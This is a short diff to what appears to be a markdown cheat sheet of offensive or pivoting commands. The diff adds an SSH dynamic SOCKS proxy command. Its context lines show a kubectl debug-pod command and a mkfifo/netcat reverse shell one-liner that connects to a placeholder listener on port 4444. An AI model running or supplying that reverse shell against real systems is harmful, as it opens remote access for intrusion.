@@ -99,3 +99,10 @@ kubectl run pod-debug --rm -i --tty --image alpine:latest -- /bin/sh
 mkfifo /tmp/fifo
 sh -i < /tmp/fifo 2>&1 | nc IP_LISTENER 4444 > /tmp/fifo
 ```
+
+### -2 
+
+SSH SOCKS proxy
+```sh
+ssh -D 1080 user@serverSSH
+```
